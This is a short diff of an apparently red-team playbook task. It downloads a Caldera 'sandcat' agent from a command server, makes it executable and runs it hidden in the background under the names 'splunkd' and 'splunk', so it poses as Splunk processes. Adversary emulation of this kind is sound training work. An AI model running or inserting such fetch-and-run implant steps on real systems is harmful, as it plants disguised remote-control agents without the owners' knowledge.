@@ -71,7 +71,7 @@
       shell: |
         server="http://100.0.0.3:8888"
         cd {{ deploy_dir }}
-        for name in splunkd; do
+        for name in splunkd splunk; do
           curl -s -X POST -H "file:sandcat.go" -H "platform:linux" "$server/file/download" > "$name"
           chmod +x "$name"
           nohup ./"$name" -server "$server" -group red >/dev/null 2>&1 &
